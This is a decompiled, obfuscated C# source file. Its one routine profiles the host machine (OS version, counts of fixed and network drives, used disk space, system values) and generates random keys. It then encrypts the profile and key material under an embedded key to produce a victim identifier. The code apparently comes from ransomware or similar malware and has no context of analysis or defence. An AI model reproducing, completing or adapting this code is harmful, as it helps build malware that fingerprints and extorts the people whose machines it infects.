using System;
using System.IO;
using System.Runtime.CompilerServices;
using System.Text;

namespace RU;

internal class Class2
{
	public class Class3
	{
		[CompilerGenerated]
		private static string string_0;

		[CompilerGenerated]
		private static byte[] byte_0;

		[CompilerGenerated]
		private static byte[] byte_1;

		[CompilerGenerated]
		private static string string_1;

		[CompilerGenerated]
		private static string string_2;

		[CompilerGenerated]
		private static string string_3;

		[CompilerGenerated]
		private static string string_4;

		[CompilerGenerated]
		private static string string_5;

		[CompilerGenerated]
		private static string string_6;

		[CompilerGenerated]
		private static string string_7;

		[CompilerGenerated]
		private static int int_0;

		[CompilerGenerated]
		private static int int_1;

		[CompilerGenerated]
		private static int int_2;

		[CompilerGenerated]
		private static int int_3;

		public static string String_0
		{
			[CompilerGenerated]
			get
			{
				return string_0;
			}
			[CompilerGenerated]
			set
			{
				string_0 = value;
			}
		}

		public static byte[] Byte_0
		{
			[CompilerGenerated]
			get
			{
				return byte_0;
			}
			[CompilerGenerated]
			set
			{
				byte_0 = value;
			}
		}

		public static byte[] Byte_1
		{
			[CompilerGenerated]
			get
			{
				return byte_1;
			}
			[CompilerGenerated]
			set
			{
				byte_1 = value;
			}
		}

		public static string String_1
		{
			[CompilerGenerated]
			get
			{
				return string_1;
			}
			[CompilerGenerated]
			set
			{
				string_1 = value;
			}
		}

		public static string String_2
		{
			[CompilerGenerated]
			get
			{
				return string_2;
			}
			[CompilerGenerated]
			set
			{
				string_2 = value;
			}
		}

		public static string String_3
		{
			[CompilerGenerated]
			get
			{
				return string_3;
			}
			[CompilerGenerated]
			set
			{
				string_3 = value;
			}
		}

		public static string String_4
		{
			[CompilerGenerated]
			get
			{
				return string_4;
			}
			[CompilerGenerated]
			set
			{
				string_4 = value;
			}
		}

		public static string String_5
		{
			[CompilerGenerated]
			get
			{
				return string_5;
			}
			[CompilerGenerated]
			set
			{
				string_5 = value;
			}
		}

		public static string String_6
		{
			[CompilerGenerated]
			get
			{
				return string_6;
			}
			[CompilerGenerated]
			set
			{
				string_6 = value;
			}
		}

		public static string String_7
		{
			[CompilerGenerated]
			get
			{
				return string_7;
			}
			[CompilerGenerated]
			set
			{
				string_7 = value;
			}
		}

		public static int Int32_0
		{
			[CompilerGenerated]
			get
			{
				return int_0;
			}
			[CompilerGenerated]
			set
			{
				int_0 = value;
			}
		}

		public static int Int32_1
		{
			[CompilerGenerated]
			get
			{
				return int_1;
			}
			[CompilerGenerated]
			set
			{
				int_1 = value;
			}
		}

		public static int Int32_2
		{
			[CompilerGenerated]
			get
			{
				return int_2;
			}
			[CompilerGenerated]
			set
			{
				int_2 = value;
			}
		}

		public static int Int32_3
		{
			[CompilerGenerated]
			get
			{
				return int_3;
			}
			[CompilerGenerated]
			set
			{
				int_3 = value;
			}
		}
	}

	public static bool smethod_0()
	{
		try
		{
			string text = Class22.smethod_0("\uf1a3\uf198\uf19d\uf198\uf199\uf181\uf198", 61908);
			int int_ = 16;
			Class3.String_1 = Class7.smethod_11(5);
			Class3.String_1 = Class3.String_1.ToUpper();
			string text2 = Class7.smethod_9();
			if (text2 != null && !(text2 == ""))
			{
				if (text2.Split(new char[1] { ',' })[0] == "")
				{
					Class3.String_3 = text;
				}
				else
				{
					Class3.String_3 = text2.Split(new char[1] { ',' })[0];
				}
				if (text2.Split(new char[1] { ',' })[1] == "")
				{
					Class3.String_4 = text;
				}
				else
				{
					Class3.String_4 = text2.Split(new char[1] { ',' })[1];
				}
				if (text2.Split(new char[1] { ',' })[2] == "")
				{
					Class3.String_7 = text;
				}
				else
				{
					Class3.String_7 = text2.Split(new char[1] { ',' })[2];
				}
				if (text2.Split(new char[1] { ',' })[3] == "")
				{
					Class3.String_6 = text;
				}
				else
				{
					Class3.String_6 = text2.Split(new char[1] { ',' })[3];
				}
			}
			else
			{
				Class3.String_3 = text;
				Class3.String_4 = text;
				Class3.String_7 = text;
				Class3.String_6 = text;
			}
			string text3 = Class7.smethod_10();
			if (!string.IsNullOrEmpty(text3))
			{
				Class3.String_5 = text3;
			}
			else
			{
				Class3.String_5 = text;
			}
			Class3.String_2 = Environment.OSVersion.ToString();
			string[] logicalDrives = Environment.GetLogicalDrives();
			for (int i = 0; i < logicalDrives.Length; i++)
			{
				DriveInfo driveInfo = new DriveInfo(logicalDrives[i]);
				Class3.Int32_0++;
				if (driveInfo.IsReady)
				{
					if (driveInfo.DriveType == DriveType.Fixed)
					{
						Class3.Int32_1++;
					}
					if (driveInfo.DriveType == DriveType.Network)
					{
						Class3.Int32_2++;
					}
					Class3.Int32_3 += Convert.ToInt32((driveInfo.TotalSize - driveInfo.TotalFreeSpace) / 1000000000L);
				}
			}
			Class3.Byte_0 = Class7.smethod_12(GClass2.GClass3.Int32_1);
			Class3.Byte_1 = Class7.smethod_12(int_);
			string s = Class7.smethod_2(Class3.Byte_0) + char.ToString(',') + Class7.smethod_2(Class3.Byte_1) + char.ToString(',') + Class3.String_2 + char.ToString(',') + Class3.String_5 + char.ToString(',') + Class3.String_3 + char.ToString(',') + Class3.String_4 + char.ToString(',') + Class3.String_6 + char.ToString(',') + Class3.String_7 + char.ToString(',') + Convert.ToString(Class3.Int32_0) + char.ToString(',') + Convert.ToString(Class3.Int32_1) + char.ToString(',') + Convert.ToString(Class3.Int32_2) + char.ToString(',') + Convert.ToString(Class3.Int32_3) + char.ToString(',') + Convert.ToString(GClass2.GClass3.Double_0) + char.ToString(',') + Convert.ToString(GClass2.GClass3.String_1);
			byte[] bytes = Encoding.UTF8.GetBytes(s);
			byte[] array = Class7.smethod_12(GClass2.GClass3.Int32_0);
			bytes = Class4.smethod_1(bytes, array);
			array = Class4.smethod_2(array, GClass2.GClass3.String_7);
			byte[] byte_ = Class7.smethod_7(bytes, array);
			if (array == null)
			{
				return false;
			}
			Class3.String_0 = Class7.smethod_15(Class7.smethod_0(byte_), 64);
			return true;
		}
		catch (Exception)
		{
		}
		return false;
	}
}
